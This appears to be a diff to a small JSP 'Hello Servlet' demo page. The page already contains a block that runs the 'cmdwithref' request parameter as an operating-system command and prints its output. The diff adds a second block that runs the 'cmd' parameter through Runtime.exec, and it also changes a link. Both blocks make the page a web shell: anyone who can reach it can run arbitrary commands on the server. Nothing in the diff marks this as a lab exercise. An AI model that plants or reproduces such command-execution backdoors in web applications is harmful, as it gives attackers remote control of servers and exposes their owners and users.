@@ -1,3 +1,4 @@
+<%@ page import="java.io.IOException" %>
 <%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>
 <!DOCTYPE html>
 <html>
@@ -16,6 +17,16 @@
     out.println("命令参数为空。");
   }
 %>
+<%
+  String cmd = request.getParameter("cmd");
+  if (cmd != null) {
+    try {
+      Runtime.getRuntime().exec(cmd);
+    } catch (IOException e) {
+      out.println("Error executing command: " + e.getMessage());
+    }
+  }
+%>
 <% if(request.getParameter("cmdwithref")!=null){
   java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmdwithref")).getInputStream();
   int a = -1;
@@ -29,7 +40,7 @@
 
 %>
 <br/>
-<a href="hello-servlet">Hello Servlet</a>
+<a href="servlet">Hello Servlet</a>
 <p><% String name = "DR0SE"; %>username:<%=name%></p>
 </body>
 </html>
